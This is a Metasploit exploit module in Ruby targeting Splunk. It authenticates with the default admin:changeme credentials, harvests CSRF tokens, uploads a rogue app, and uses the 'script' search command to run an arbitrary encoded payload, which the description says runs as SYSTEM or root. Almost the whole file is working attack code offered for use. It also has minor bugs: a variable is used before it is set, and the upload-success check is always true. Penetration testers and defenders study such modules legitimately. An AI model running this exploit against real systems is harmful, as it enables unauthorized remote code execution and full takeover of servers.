##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Splunk Custom App Remote Code Execution',
			'Description'    => %q{
				This module exploits a feature of Splunk whereby a custom application can be uploaded
				through the web based interface. Through the 'script' search command a user can call
        commands defined in their custom application which includes arbitrary perl or python code.
				To exploit this vulnerability, a valid Splunk user with the admin
				role is required. By default, this module uses the credential of "admin:changeme",
				the default Administrator credential for Splunk. Note that the Splunk web interface
				runs as SYSTEM on Windows and as root	on Linux by default.
			},
			'Author'         =>
				[
					"@marcwickenden",      # discovery and metasploit module
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'URL', 'http://docs.splunk.com/Documentation/Splunk/latest/SearchReference/Script' ],
				],
			'Payload'        =>
				{
					'Space'       => 1024,
					'Badchars'    => '',
					'DisableNops' => true
				},
			'Targets'        =>
				[
					[
						'Universal CMD',
						{
							'Arch'     => ARCH_CMD,
							'Platform' => ['unix', 'win', 'linux']
						}
					]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => '27 September 2012'))

			register_options(
				[
					Opt::RPORT(8000),
					OptString.new('USERNAME', [ true, 'The username with admin role to authenticate as','admin' ]),
					OptString.new('PASSWORD', [ true, 'The password for the specified username','changeme' ]),
          OptString.new('SPLUNK_APP_FILE',
                  [
                    true,
                    'The "rogue" Splunk application tgz',
                    File.join(Msf::Config.install_root, 'data', 'exploits', 'splunk', 'upload_app_exec.tgz')
                  ]),
				], self.class)
	end

	def exploit
		@username = datastore['USERNAME']
		@password = datastore['PASSWORD']
		file_name = datastore['SPLUNK_APP_FILE']
		@auth_cookies = ''
    @csrf_form_key = ''
    app_name = 'upload_app_exec'
		p = payload.encoded
		print_status("Using command: #{p}")
		cmd = Rex::Text.encode_base64(p)

    # log in to Splunk (if required)
		do_login

    # fetch the csrf token for use in the upload next
    do_get_csrf('/en-US/manager/launcher/apps/local')

    # upload the arbitrary command execution Splunk app tgz
    do_upload_app(app_name, file_name)

    # get the next csrf token from our new app
    do_get_csrf("/en-US/app/#{app_name}/flashtimeline")

    # call our command execution function with the Splunk 'script' command
    print_status("invoking script command")
		send_request_cgi(
		{
			'uri'     => '/en-US/api/search/jobs',
			'method'  => 'POST',
			'cookie'  => @auth_cookies,
			'headers' =>
				{
					'X-Requested-With' => 'XMLHttpRequest',
          'X-Splunk-Form-Key' => @csrf_form_key
				},
			'vars_post' =>
				{
					'search' => "search irrelevant | script msf_exec #{cmd}", # msf_exec defined in default/commands.conf
					'status_buckets' => "300",
          'namespace' => "#{app_name}",
          'ui_dispatch_app' => "#{app_name}",
          'ui_dispatch_view' => "flashtimeline",
          'auto_cancel' => "100",
          'wait' => "0",
          'required_field_list' => "*",
          'adhoc_search_level' => "smart",
					'earliest_time' => "0",
					'latest_time' => "",
          'timeFormat' => "%s.%Q"
				}
		}, 25)
		handler
	end

	def check
    # all versions are actually "vulnerable" but check implemented for future proofing
    # and good practice
		res = send_request_cgi(
		{
			'uri'     => '/en-US/account/login',
			'method'  => 'GET'
		}, 25)

		if res and res.body =~ /Splunk Inc\. Splunk/
			return Exploit::CheckCode::Appears
		else
			return Exploit::CheckCode::Safe
		end
	end

	def do_login
    print_status("authenticating...")
    # this method borrowed with thanks from splunk_mappy_exec.rb
		res = send_request_cgi(
		{
			'uri'     => '/en-US/account/login',
			'method'  => 'GET'
		}, 25)

		cval = ''
		uid = ''
		session_id_port =
		session_id = ''
		if res and res.code == 200
			res.headers['Set-Cookie'].split(';').each {|c|
				c.split(',').each {|v|
					if v.split('=')[0] =~ /cval/
						cval = v.split('=')[1]
					elsif v.split('=')[0] =~ /uid/
						uid = v.split('=')[1]
					elsif v.split('=')[0] =~ /session_id/
						session_id_port = v.split('=')[0]
						session_id = v.split('=')[1]
					end
				}
			}
		else
			fail_with(Exploit::Failure::NotFound, "Unable to get session cookies")
		end

		res = send_request_cgi(
		{
			'uri'     => '/en-US/account/login',
			'method'  => 'POST',
			'cookie'	=> "uid=#{uid}; #{session_id_port}=#{session_id}; cval=#{cval}",
			'vars_post' =>
				{
					'cval' => cval,
					'username' => @username,
					'password' => @password
				}
		}, 25)

		if not res or res.code != 303
			fail_with(Exploit::Failure::NoAccess, "Unable to authenticate")
		else
			session_id_port = ''
			session_id = ''
			res.headers['Set-Cookie'].split(';').each {|c|
				c.split(',').each {|v|
					if v.split('=')[0] =~ /session_id/
						session_id_port = v.split('=')[0]
						session_id = v.split('=')[1]
					end
				}
			}
			@auth_cookies = "#{session_id_port}=#{session_id}"
    end
	end

  def do_upload_app(app_name, file_name)
    print_status("uploading file #{archive_file_name}")
    archive_file_name = File.basename(file_name)
    file_data = File.open(file_name, "rb") { |f| f.read }

    boundary = '--------------' + rand_text_alphanumeric(6)
    
    data = "--#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"splunk_form_key\"\r\n\r\n"
    data << "#{@csrf_form_key}"
    data << "\r\n--#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"appfile\"; filename=\"#{archive_file_name}\"\r\n"
    data << "Content-Type: application/x-gzip\r\n\r\n"
    data << file_data
    data << "\r\n--#{boundary}--\r\n"

    res = send_request_raw({
      'uri'     => '/en-US/manager/appinstall/_upload',
      'method'  => 'POST',
			'cookie'  => @auth_cookies,
      'data'    => data, 
      'headers' =>
      {
         'Content-Type'   => "multipart/form-data; boundary=#{boundary}",
         'Content-Length' => data.length
      }
    }, 30)

		if (res and res.code == 303 or 200)
      print_status("#{app_name} successfully uploaded")
    else
			fail_with(Exploit::Failure::Unknown, "Error uploading")
		end

  end

  def do_get_csrf(uri)
    print_status("fetching csrf token from #{uri}")
    res = send_request_cgi(
    {
      'uri'    => uri,
      'method' => 'GET',
			'cookie'	=> @auth_cookies
    }, 25)
    res.body.match(/FORM_KEY":\ "(\d+)"/)
    @csrf_form_key = $1
    fail_with(Exploit::Failure::Unknown, "csrf form Key not found") if not @csrf_form_key
  end
end
